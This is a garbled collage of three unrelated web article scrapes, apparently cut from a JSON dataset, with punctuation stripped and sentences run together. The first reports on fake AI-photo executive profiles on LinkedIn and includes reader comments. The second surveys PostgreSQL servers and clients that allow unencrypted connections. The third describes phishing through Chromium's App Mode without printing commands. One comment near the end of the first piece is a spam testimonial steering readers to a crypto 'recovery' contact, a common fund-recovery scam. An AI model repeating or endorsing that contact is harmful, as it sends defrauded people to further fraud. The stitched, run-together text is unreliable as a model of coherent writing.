        "text": "A recent proliferation of phony executive profiles on LinkedIn is creating something of an identity crisis for the business networking site and for companies that rely on it to hire and screen prospective employees The fabricated LinkedIn identities which pair AI-generated profile photos with text lifted from legitimate accounts are creating major headaches for corporate HR departments and for those managing invite-only LinkedIn groupsSome of the fake profiles flagged by the co-administrator of a popular sustainability group on LinkedInSince then the response from LinkedIn users and readers has made clear that these phony profiles are showing up en masse for virtually all executive roles but particularly for jobs and industries that are adjacent to recent global events and news trendsWe receive over 500 fake profile requests to join on a weekly basis Taylor said Its hit like hell since about January of this year Prior to that we did not get the swarms of fakes that we now experienceThe opening slide for a plea by Taylors group to LinkedInTaylor recently posted an entry on LinkedIn titled The Fake ID Crisis on LinkedIn which lampooned the 60 Least Wanted Crisis Relief Experts fake profiles that claimed to be experts in disaster recovery efforts in the wake of recent hurricanes The images above and below show just one such swarm of profiles the group flagged as inauthentic Virtually all of these profiles were removed from LinkedIn after KrebsOnSecurity tweeted about them last weekAnother swarm of LinkedIn bot accounts flagged by Taylors groupWhen a bot tries to infiltrate the group it does so in waves Miller said Well see 20-30 requests come in with the same type of information in the profilesAfter screenshotting the waves of suspected fake profile requests Miller started sending the images to LinkedIns abuse teams which told him they would review his request but that he may never be notified of any action takenSome of the bot profiles identified by Mark Miller that were seeking access to his DevOps LinkedIn group Miller said these profiles are all listed in the order they appearedMiller said that after months of complaining and sharing fake profile information with LinkedIn the social media network appeared to do something which caused the volume of group membership requests from phony accounts to drop precipitouslyI wrote our LinkedIn rep and said we were considering closing the group down the bots were so bad Miller said I said You guys should be doing something on the backend to block thisLathrop said that about two months ago his employer noticed waves of new followers and identified more than 3000 followers that all shared various elements such as profile photos or text descriptionsThen I noticed that they all claim to work for us at some random title within the organization Lathrop said in an interview with KrebsOnSecurity When we complained to LinkedIn theyd tell us these profiles didnt violate their community guidelines But like heck they dont These people dont exist and theyre claiming they work for usLathrop said that after his companys third complaint a LinkedIn representative responded by asking ISOutsource to send a spreadsheet listing every legitimate employee in the company and their corresponding profile links Not long after that the phony profiles that were not on the companys list were deleted from LinkedIn Lathrop said hes still not sure how theyre going to handle getting new employees allowed into their company on LinkedIn going forwardBut the Sustainability Group administrator Taylor said the bots hes tracked strangely dont respond to messages nor do they appear to try to post contentClearly they are not monitored Taylor assessed Or theyre just created and then left to festerThis experience was shared by the DevOp group admin Miller who said hes also tried baiting the phony profiles with messages referencing their fakeness Miller sayshes worried someone is creating a massive social network of bots for some future attack in which the automated accounts may be used to amplify false information online or at least muddle the truthIts almost like someone is setting up a huge bot network so that when theres a big message that needs to go out they can just mass post with all these fake profiles Miller saidIn last weeks story on this topic I suggested LinkedIn could take one simple step that would make it far easier for people to make informed decisions about whether to trust a given profile Add a created on date for every profile Twitter does this and its enormously helpful for filtering out a great deal of noise and unwanted communicationsMany of our readers on Twitter said LinkedIn needs to give employers more tools perhaps some kind of application programming interface API that would allow them to quickly remove profiles that falsely claim to be employed at their organizationsAnother reader suggested LinkedIn also could experiment with offering something akin to Twitters verified mark to users who chose to validate that they can respond to email at the domain associated with their stated current employer In response to questions from KrebsOnSecurity LinkedIn said it was considering the domain verification ideaThis is an ongoing challenge and were constantly improving our systems to stop fakes before they come online LinkedIn said in a written statement We do stop the vast majority of fraudulent activity we detect in our community around 96 of fake accounts and around 991 of spam and scams Were also exploring new ways to protect our members such as expanding email domain verification Our community is all about authentic people having meaningful conversations and to always increase the legitimacy and quality of our communityWhats clear is that LinkedIns cachet as being the social network for serious professionals makes it the perfect platform for lulling members into a false sense of security Bloombergs Tim Cuplan wrote Exacerbating the security risk is the vast amount of data that LinkedIn collates and publishes and which underpins its whole business model but which lacks any robust verification mechanisms This entry was posted on Wednesday 5th of October 2022 0520 PM Its super common in Facebook too I co-admin a group for stock tradingmarket newspersonal finance discussion with over 15000 members When I became an admin third of three and one of only two active admins I did so to help combat scammers and spammers because I have professional experience combating online abuse At that time the group had over 17000 members I have culled over 2000 in addition to helping field around 100-150 new member requests per weekand most weeks only at most one or two of those requests are legitimateI dont admin any other active groups so I assumed my group was likely being targeted because of its theme making a juicier pool of potential victims for financial fraud and crypto scams but a friend of mine recently made a group for cheesecake lovers and within a couple weeks was cheering about hitting the 50k members mark but also complains regularly about the behavior of group members she seems hesitant to accept that in all likelihood half or more of her members are probably fakeAnd Facebook is absolutely awful about acting on abuse reports No matter how clear obvious or blatant the abuse being committed Facebook almost always says that no rules were broken and declines to take enforcement action usually without ever allowing a human to get involved but the humans rarely act even when they are involvednow doubt about FB and their customerconsumer interactions Its wishful thinking when reporting anything And they are often heavy handed when its automated punishments 30 days bans for people in a private group that discus security issues because we mention items in conversation that happen to be sensitive topics to the FB police They have a way to challenge it but its a joke too I just take it for granted that all social medias main purpose is to guide peoples opinions to those that the ownerboard want people to have to be good little consumers that only think what they are allowed to talk about Not a place for humans that think asking to send a spreadsheet listing every legitimate employee that were not on the companys listThats not the way data privacy works Rather than giving up all your employees like that properly put the onus on LinkedIn not to libel you by publishing false claims about your business We do stop around 96 of fake accountsWhy do companies say things like this as if they were bragging about doing a good job rather than realizing theyre admitting to doing a terrible job The fullness of their statement is essentially You know those 12700 fake accounts you personally noticed Well our garbage system was really allowing around 325000 fake accounts to get createdTheres no reason to think this isnt in some way intentional by LinkedIn for whatever reason Its trivially easy to put measures in place to stop this far beyond a simple created on date I mean the whole site is the network effect in action and theyre allowing anyone to claim a connected node Thats a level of ineptitude that rises to the level of maliciousnefarious No organization that values competence should be dealing with LinkedInNo organization that values competence should be dealing with LinkedInAbsolutely correct Anyone with a modicum of sense and critical thinking ability should immediately understand that a for-profit open social network like LinkedIn that enforces no rules or standards is and will always be utterly untrustworthyLinkedIn used to spam the bejaysus out of me even after I begged them to stop I wont have anything to do with spammerscynical attempts to exploit Humanitarian Relief and Crisis Relief expertsDoesnt that imply they once cared Else whats the baseline for cynicismYou saw the Ukraine referendums 99 should be enough for anyoneThe number one reason I left facebook dating websites all social media and soon to leave linkedin is fake profiles I do not want fake profiles wasting my time and I do not like fake profiles trying to influence my values Life is so much better when I remove the fake profile noise and tune out the internet social media crapWell I wrote a good response that apparently got filtered by the approval bot Im used to that my writing style tends to be a bit colorful and um loquacious so sometimes I may come off as Saul Goodman meets Hunter S Thompson to these bots but really all I wanted to say is Life is so much better when I remove the fake profile noise and tune out the internet social media crapWord and church Tim2DaG best comment on here yetNulling FaceBook was a no-brainer for me once I was able to finally suck my mind out of it in about 2018 and dont even bother to get me started about their securityLinkedIn took a little longer for me to see behind the Oz curtain because many of the potential phishing attempts in my gmail from alledged recruiters appear to be sent through the LinkedIn proprietary message system but dont stand up to even cursory cross-checking of the alledged recruiter names company names eMail addies and URLs against valid company URLs and employee lists and a significant number of these reference alledged Indian divisions of real global corporationsWhat is grossly maddening and saddeningly insidious is that the ner-do-wells as CyberHero Brian Krebs all too generously refers to them are abusing these kinds of sites to prey on alot of truly nice people who are earnestly just trying to find honest work because their families need food on their tables around 325000 fake accounts to get created Then the 325000 fake accounts sent requests to everyone in their address books to Join my LinkedIn network s Reference to the early days of LinkedIn behavior of conscripting unsuspecting users into spamming all their friends Of course the bots have no one else in their address booksThis Its happeningI had a number of weird accounts try to connect not that long ago they were all crypto related and came out of the blue Perhaps a similar scenarioStopping 96 of fake accounts implies they know they must know that other 4 are fake yet arent doing anything about itNo you bag of potatoes It means that their current methods of stopping accounts can take care of 96 of fake accounts However there are 4 where their tools havent been able to successfully remove but they still know about them and the accounts will be removed manually not efficient Therefore there is still room for improvement which will always be the case for fake accounts Its an endless battleThere should be a place to apply so one can be vetted for created sock puppet accounts as being authentic and part of an RTE Because stuff like this happens it would make sense to test an enterprise against it right Also why not request that this-fill in the blank- does not exist add metadata that large social media companies can detect If for anything else to monitor to see unknown TTPs being utilized Then there is the issue of privacy My profile just doesnt have a headshot The only thing that verifying myself through my company does is gives them access to my LinkedIn profile which kinda defeats the purpose I dont want my company seeing my profile unless its to verify what I am putting as my experience through them specifically Domain verification guess what didnt work LinkedIn is caught and tossed from the spam filter immediately Theres a difference between letting companies be assessed for potential insider threats people saying they had a job that they didnt or responsibilities and letting North Korea set up a ton of CISO HIGH LEVEL C-SUITE be created with little to no filtering How could LI not be going after crypto scams before any of this happened That has been a known threat for a decadeI used LinkedIn a bunch when I was working before I retired I was not shopping connections or prospects but more learning about a legitimate business or person But it kept getting worse with the solicited connections or groups or people who seem to put some value on how many connections friends the have I had already deleted FB and after retiring likewise for LinkedIn Problem solvedIt cant be no worse then all the fake accounts on FacebookExcept a random FB page isnt lending undue credential as a security professionalThe same problems exist in different ratios and means but FB isnt taken seriouslywhere LI unfortunately and ridiculously isLinkedin is the perfect Scam Platform i learned from the movie The Wolf of WallstreetSell me this pencil Sell me this pencilThat was the first exercise in my sales training courseThe other thing I remember is the phrase Would you like it in green That was the suggested response to a customer asking Do you have it in green when youre trying to sell them a beige box ie we can get some green car-body spray In theory if they say Yes youve closed the saleMost of the CISOs and other cybersecurity executives in the US are unqualified and incompetent any wayAttorneys Physicians alike need to go through rigorous academic and real world experience before they start practicing Any Tom and Dick who have executive contacts can become a CISO in this country with a degree in Music Not kiddingLEAVE NOW This is the best advice I can give I never joined any of those web 20 purveyors going back to myspace and the like where you are the product you are providing their content Disconnect drop out tune in to paraphrase Dr Tim Leary Its all a bunch of bull meant to keep you preoccupied while they rake in oodles of cash using you as their bait Illegal Not in most countries Immoral AbsolutelyI was told and Brian reiterates here to stake my claim plant my flag on these slimeball sites because it is intimated that someone else will impersonate me and ruin my reputation If someone is using these sites to find out what a person is worth then need to have their head examined Even profiles that have real people behind them are full of misdirection and bluffs that have replaced the love-me-wall at work I mean Crisis relief thinker Branding queen Yes I know those are on the fake profiles but they were copied from real ones somewhereHopefully everyone will soon realize how easy it is to fool these companies into having fake data fake profiles fake lives show up when anyone cares to look and then there will be a great reckoning Either disconnect and get back to real face-to-face meetings and phone calls or force these companies to spend millions or billions to implement hither-to-unannounced highly-invasive features to remedy the problem Which will probably cost the users too in real dineroRemedy until the next brilliant nefarious mind comes along that isThanksI just had a fake profile apply to an open position at my org I am one of those rare hiring managers who reads every resume and cover letter I receive and matches it against LinkedIn or portfolio sites if I want to go the next stage Nothing and I mean nothing aside from the name and profile picture which looked like a stock image matched between the resume and LinkedIn profile Everything from the background to location to education was completely different I flagged it for the hiring team after assuming it was someone trying to get a job for someone else Now it seems far more sinisterUnfortunately ever since MSFT took it over its been a cesspool I always thank God Im retired from IT the way its going downhill even faster its just taking so long to sink because its so huge and it has the 800lb gorilla in Redmond behind itI STILL get weekly spamphishing emails from accounts with no picture 500 connections and a very short historyIts really too bad It started out as a really nice tool from 2003 to about 2016and it just got worse from there onSadActually I have been getting a lot of requests from weird accounts lately and this is getting very serious Thank you for sharing thoYes I tried LinkedIn once or three times Did not much like it Have not used it for quite some time It is a little irritating for meOk now after 3 posts apparently rejected by the site censor bot this is a test post with no possible objectionable content or verbiageRes5TestInternet job sites are manipulators I would stay far away from this crowd people tend to trust anyone in these areasalso what I dont understand is how the corporate world can fall head over for itFake profiles for fake jobs Crisis relief expert Networking Guru Remote hiring expert Those are all fake jobs where anyone can easily claim qualificationsI have been following up on crypto trades ever since I got to know about it I finally decided to involve in it so I got money out of my savings and put into it along the line it all seemed good trading then one day I couldnt gain access to the crypto account and I kept receiving mails that my money was removed from it I was fuming and almost went wild with the whole situation until I came across an article about CryptoSwiftRecovery AT g mail com and how they help with such a case as my own contacted them and explained my story to them and they required some details from me about the crypto account finally they were able to help me recover every bit of my money that I thought was gonecaptin uranis is comin to get yaTheb biggest issue is I can create one linkedin profile with one email no need verification Should let every one verify this is you

        "title": "The Majority of PostgreSQL Servers on the Internet are Insecure by Jonathan Mortensen The Inner Join",
        "text": "The Inner Join--2ListenShareThe situation doesnt stop with PostgreSQL servers most popular SQL clients are more than happy to accept unencrypted connections without a warning We conducted an informal survey of 22 popular SQL clients and found that only two require encrypted connections by default Another six will ask for encryption but silently accept an unencrypted connection The remaining 14 require the user to opt-in to using SSL connections are unencrypted by defaultWhen you connect to a website through your web browser data you send and receive is probably encrypted Its amazing then that data sent to and from Internet-connected PostgreSQL servers is very likely unencrypted Its a problemSimply having a certificate isnt enough Almost 12000 40 of the certificates were expired Figure 1 Furthermore more than 128000 433 of the certificates were self-signed Connections to servers with self-signed certificates are encrypted but the certificates often do not confer trust generally they are neither issued nor validated by a certificate authority they dont expire and they cant be revoked Most clients do not have a root certificate for a given self-signed certificate so they cant connect using verify-full without which clients are subject to man-in-the-middle attacks more on this laterThis leaves us with 160310 PostgreSQL servers with certificates that are neither expired nor self-signed Connections to these servers still are not guaranteed to be encrypted as many PostgreSQL clients do not enable SSL connections by default and those that do wont necessarily validate the servers certificate by default Similarly PostgreSQL servers that support SSL and have valid SSL certificates do not always require that those certificates be used Supporting encryption sounds better than nothing but given insecure client defaults its not that much better than no encryptionWe found that from the approximately 820000 PostgreSQL servers in the survey 64 did not support SSL Another 23 supported but definitely did not require the use of SSL Only 7 likely or definitely required encryption For another 7 we were able to establish that SSL was supported but could make no further inferences about whether its use was requiredThis is a sad state of affairs The vast majority of PostgreSQL servers listening on the Internet either do not support encrypted connections at all or they support encryption but accept unencrypted traffic It gets worse SQL clients have a say in whether to use encryption when connecting to a PostgreSQL server and most of them are more than happy to not To understand this insecure behavior we have to take a moment to understand how SSL actually works with PostgreSQLFor the purpose of this post there are three important things to understand about how SSL connections work in PostgreSQLWe did a survey of five popular PostgreSQL programming language libraries and 22 SQL clients to see what their default encryption options are and whether the user can easily change those optionsThe standard PostgreSQL library for Python is psycopg 2 and 3 which uses libpq so its default mode is to prefer ssl This means the connection methods will first attempt an encrypted connection but then fall back to an unencrypted method if the server does not support SSL The other language libraries surveyed jdbc npgsql node-postgres and pgx have SSL disabled by default so the user is responsible for configuring encryption Table 1None of these libraries used verify-full require or allow settings Libraries that default to verify-full will validate server certificates most securerequire means that the connection will be closed if the server does not support SSL And allow means that the client will first attempt an unencrypted connection but will accept an encrypted connection if the server requires itWe took an informal survey of SQL clients and checked their default encryption options Table 2 We saw a few different settings in this sample Postico is the only one that defaults to verify-full meaning that it will validate the server certificate and warn the user if it failsMost clients have SSL disabled by default and provide only two options for enabling it Figure 3 It is often not clear which setting is enabled by toggling SSL on though some clients provide advanced configuration options that for instance allow the user to provide certificate filesWhere does this leave us Most PostgreSQL servers either dont support or dont require encrypted connections And most clients by default will attempt an unencrypted connection and wont warn you if your connection is unencrypted and youre at risk of exposing data Theres no icon and no warning message like in the browserIf you are a developer use sslmode verify-full in your client In some programming languages youll need to point the library to your certificate store Were looking at you Java but thats a short amount of pain for a lifetime of better securityIf you are a user make sure SSL is enabled in your clients and if possible set your sslmode to verify-fullIf you make a PostgreSQL tool set your defaults to use verify-full Postico provides a great example of how to gracefully degrade to insecure with user consentIf youre a maintainer of PostgreSQL itself change from insecure to secure defaults in the next major release Its time We think its highly unlikely that all of these insecure servers and clients are intentionally insecureIf these changes cant be made in the upcoming PG15 release at the very least add warnings of deprecation of insecure configurations and of a looming configuration default change and then do it in PG16There are two common arguments against this analysis and moving to encryption as a default that wed like to address directlyThese points may have been true ten years ago With 800k servers accessible on the Internet and with the move toward SaaS data tools and databases that lower the bar to entry the data world is no longer only in secure environments and only used by experts Its full of nocodelocode users and data analysts focusing on delivering value not sysadmin and security engineering Lets set them up to do things securely by default with clear escape hatches just like the browsers have doneShodan uses the Python psycopg2 package to connect to each PostgreSQL server and record the resulting message psycopg2 uses libpq which defaults to sslmodeprefer With this approach shodans client will first attempt to connect with SSL and upon receiving an error message during authentication will make a second connection attempt without encryption Depending on the content in these error messages and whether each server has an SSL certificate we can infer the SSL mode of most of the serversSpecifically we used the following logicThe PostgreSQL sslconfiguration parameters configures TLS encrypted connections Here and throughout we use SSL for simplicityA quick dance between a client and a server determines whether a connection will use SSL A client may ask to use SSL via an SSLRequest message and the server may accept that request or deny that request via an S or N response In the case of receiving an N response the client can then choose to either accept an unencrypted connection or to abortAn additional step Certificate validation may occur during the TLS handshake Certificate validation is the process by which the client determines whether the certificate presented by the server is legitimate Certification validation prevents malicious servers from impersonating the true server to which a client intended to connect ie a man-in-the-middle attack Many books have been written on this topic for this post just consider it an important required feature for secure encryptionMost PostgreSQL clients have a setting often named sslmode that specifies which paths to try For libpq which is the underlying library for most clients the settings areEach PostgreSQL client and tool must choose a default And these defaults are often selected for backward compatibility rather than security In the core PostgreSQL client library libpq and the one used by the psql command line tool the default is preferThe default value for sslmode is prefer this makes no sense from a security point of view and it only promises performance overhead if possible It is only provided as the default for backward compatibility and is not recommended in secure deploymentsSo you may think that because a PostgreSQL client supports SSL that it will create an encrypted connection to a server But thats not always the case You can unknowingly be sending your critical database traffic in the clear because your client uses a default of prefer allow or disable and the server youre connecting to does not support SSL You probably wont get warnings on the client or the server eitherSo you may think that because a PostgreSQL server supports SSL but does not require SSL that your client will create an encrypted connection to that server But thats not always the case You can unknowingly be sending your critical database traffic in the clear because your client uses a default of allow or disable while the server youre connecting to does in fact support SSL You probably wont get warnings on the client or the server eitherpython the standard is psycopg 2 3 and that uses libpq so the default is prefer and its easy enough to change to verify-full By default you are at risk if the server doesnt support SSL since psycopg will silently connect to that server without telling you the connection is not encrypted You are also at risk because the client doesnt care if the certificate given by the server is valid----2The Inner JoinJonathan MortenseninThe

        "text": "A new phishing technique using Chrome's Application Mode feature allows threat actors to display local login forms that appear as desktop applications making it easier to steal credentialsThe Application Mode feature is available in all Chromium-based browsers including Google Chrome Microsoft Edge and the Brave Browser It can generate realistic-looking login screens that are hard to differentiate from a legitimate login promptBecause desktop applications are generally harder to spoof users are less likely to treat them with the same caution they reserve for browser windows that are more widely abused for phishingChrome's application mode allows web developers to create web apps with a native desktop appearance suitable for ChromeOS or users who want to enjoy a clean minimalist interface like watching YouTubeThe app mode allows websites to launch in a separate window that doesn't display a URL address bar browser toolbars etc while the Windows Taskbar displays the website's favicon instead of Chrome's iconThis can allow threat actors to create fake desktop login forms and if the user isn't knowingly launching these apps it could lead to sneaky phishing attacksTo conduct an attack using the technique threat actors must first convince a user to run a Windows shortcut that launches a phishing URL using Chromium's App Mode featureHowever installing malware is very noisy and can easily be detected by security software running on the machine On the other hand opening a browser to a new phishing URL will less likely be detectedWith Microsoft Edge now installed in Windows 10 and later by default it is easier to conduct these attacks as threat actors can simply distribute Windows shortcut files that launch Microsoft EdgeAs mrd0x explains in his post using the following commands a malicious attacker could create shortcuts that launch a phishing applet on the target's computerAlthough this would require access to the target's machine which is a strong prerequisite this isn't the only way to abuse Chrome's app modeAlternatively the attacker can use a portable HTML file to launch the attack embedding the -app parameter to point to a phishing site and distribute the files to targetsThe researcher also claims it's possible to launch the attack on macOS and Linux using the appropriate commands for these operating systemsThe phishing window can also receive action commands via JavaScript like closing after the user enters their login credentials accepting window resize requests or rendering on a specific position on the screenThe attack's potential is limited due to the requirement that Chromium app mode is launched locally on a device This local access means that there is already some degree of compromise of the deviceHowever once threat actors trick a target into launching a Windows shortcut the potential for advanced phishing attacks is only limited by an attacker's creativityUpdate 10622 Google shared the following statement regarding using the Chromium Application Mode feature for phishing attacks"
